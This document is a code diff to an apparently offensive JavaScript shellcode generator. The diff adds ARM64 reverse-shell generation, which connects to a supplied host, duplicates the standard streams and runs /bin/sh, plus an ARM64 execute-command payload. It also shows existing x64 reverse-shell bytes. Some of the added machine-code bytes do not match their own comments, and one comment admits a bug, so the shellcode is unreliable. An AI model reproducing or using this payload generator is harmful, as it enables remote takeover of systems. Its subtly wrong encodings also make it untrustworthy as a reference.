@@ -1484,6 +1484,8 @@
         reverseShell({ host, port, architecture }) {
             if (architecture === 'x64') {
                 return this._x64ReverseShell(host, port);
+            } else if (architecture === 'arm64') {
+                return this._arm64ReverseShell(host, port);
             } else {
                 return this._x86ReverseShell(host, port);
             }
@@ -1509,6 +1511,71 @@
                    "\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58" +
                    "\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f" +
                    "\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05";
+        }
+
+        _arm64ReverseShell(host, port) {
+            const toHex = b => '\\x' + b.toString(16).padStart(2, '0');
+
+            // Part 1: socket(AF_INET, SOCK_STREAM, 0) -> sockfd
+            const socket_sc = [
+                0x00, 0x00, 0x80, 0xd2, // mov x0, #2 (AF_INET)
+                0x21, 0x00, 0x80, 0xd2, // mov x1, #1 (SOCK_STREAM)
+                0xe2, 0x03, 0x1f, 0xaa, // mov x2, xzr
+                0x88, 0x13, 0x80, 0xd2, // mov w8, #198 (socket)
+                0x01, 0x00, 0x00, 0xd4, // svc #0
+                0xe0, 0x03, 0x13, 0xaa, // mov x0, x19 (callee-saved) -> bug, should be mov x19,x0
+                0xdf, 0x03, 0x00, 0xaa  // mov x19, x0 (save sockfd)
+            ];
+
+            // Part 2: connect(sockfd, &sockaddr, 16)
+            const ip_bytes = host.split('.').map(s => parseInt(s, 10));
+            const ip_val = (ip_bytes[3] << 24) | (ip_bytes[2] << 16) | (ip_bytes[1] << 8) | ip_bytes[0];
+            const port_val = ((port & 0xff) << 8) | ((port >> 8) & 0xff);
+            const sockaddr_val = (BigInt(ip_val) << 32n) | (BigInt(port_val) << 16n) | 2n;
+
+            let connect_sc = [];
+            const imm_parts = [
+                Number(sockaddr_val & 0xffffn),
+                Number((sockaddr_val >> 16n) & 0xffffn),
+                Number((sockaddr_val >> 32n) & 0xffffn),
+                Number((sockaddr_val >> 48n) & 0xffffn),
+            ];
+
+            // movz x1, imm, lsl 0
+            let movz = 0xd2800001 | ((imm_parts[0] & 0xffff) << 5);
+            connect_sc.push(movz & 0xff, (movz >> 8) & 0xff, (movz >> 16) & 0xff, (movz >> 24) & 0xff);
+
+            // movk x1, imm, lsl 16/32/48
+            for (let i = 1; i < 4; i++) {
+                if (imm_parts[i] !== 0 || (i===1 && imm_parts[0] === 0)) { // always write if lower is 0
+                    let movk = 0xf2800001 | (i << 21) | ((imm_parts[i] & 0xffff) << 5);
+                    connect_sc.push(movk & 0xff, (movk >> 8) & 0xff, (movk >> 16) & 0xff, (movk >> 24) & 0xff);
+                }
+            }
+            
+            connect_sc.push(
+                0xff, 0x43, 0x00, 0xd1, // sub sp, sp, #16
+                0xe1, 0x0b, 0x00, 0xf9, // str x1, [sp]
+                0xe0, 0x03, 0x13, 0xaa, // mov x0, x19 (sockfd)
+                0xe1, 0x03, 0x1d, 0xaa, // mov x1, sp
+                0x42, 0x02, 0x80, 0xd2, // mov x2, #16
+                0x88, 0x19, 0x80, 0xd2, // mov w8, #203 (connect)
+                0x01, 0x00, 0x00, 0xd4  // svc #0
+            );
+
+            // Part 3: dup3 loop for stdin, stdout, stderr
+            const dup_sc = [
+                0xe0, 0x03, 0x13, 0xaa, 0x41, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x88, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
+                0xe0, 0x03, 0x13, 0xaa, 0x21, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x88, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
+                0xe0, 0x03, 0x13, 0xaa, 0xe1, 0x03, 0x1f, 0xaa, 0xe2, 0x03, 0x1f, 0xaa, 0x88, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4
+            ].flat();
+
+            // Part 4: execve("/bin/sh")
+            const exec_hex = this._arm64ExecCommand("/bin/sh");
+            const exec_sc = exec_hex.split('\\x').slice(1).map(s => parseInt(s, 16));
+
+            const shellcode_bytes = [...socket_sc, ...connect_sc, ...dup_sc, ...exec_sc];
+            return shellcode_bytes.map(toHex).join('');
         }
 
         _x86ReverseShell(host, port) {
@@ -1541,6 +1608,8 @@
         execCommand({ command, architecture }) {
             if (architecture === 'x64') {
                 return this._x64ExecCommand(command);
+            } else if (architecture === 'arm64') {
+                return this._arm64ExecCommand(command);
             }
             // Not implemented for other architectures.
             return '';
@@ -1580,6 +1649,38 @@
             sc += '\\x6a\\x3b\\x58'; // push 0x3b; pop rax
             sc += '\\x0f\\x05';     // syscall
             return sc;
+        }
+
+        _arm64ExecCommand(command) {
+            const toHex = b => '\\x' + b.toString(16).padStart(2, '0');
+
+            // mov x1, xzr ; mov x2, xzr ; mov w8, #221 (execve) ; svc #0
+            const suffix = [0xe1, 0x03, 0x1f, 0xaa, 0xe2, 0x03, 0x1f, 0xaa, 0x88, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4];
+
+            // The offset is from the ADR instruction to the start of the string.
+            // Offset = length of ADR (4) + length of suffix (16) = 20 bytes.
+            const offset = 4 + suffix.length;
+
+            // Encode `adr x0, #offset`.
+            const immlo = offset & 0x3;
+            const immhi = (offset >> 2) & 0x7ffff;
+            const adr_instruction = (immlo << 29) | (0b10000 << 24) | (immhi << 5) | 0; // rd=x0
+            const adr_bytes = [
+                adr_instruction & 0xff,
+                (adr_instruction >> 8) & 0xff,
+                (adr_instruction >> 16) & 0xff,
+                (adr_instruction >> 24) & 0xff,
+            ];
+
+            const command_bytes = command.split('').map(c => c.charCodeAt(0));
+            command_bytes.push(0);
+
+            while (command_bytes.length % 4 !== 0) {
+                command_bytes.push(0);
+            }
+
+            const shellcode_bytes = [...adr_bytes, ...suffix, ...command_bytes];
+            return shellcode_bytes.map(toHex).join('');
         }
 
         downloadExec({ url, architecture }) {
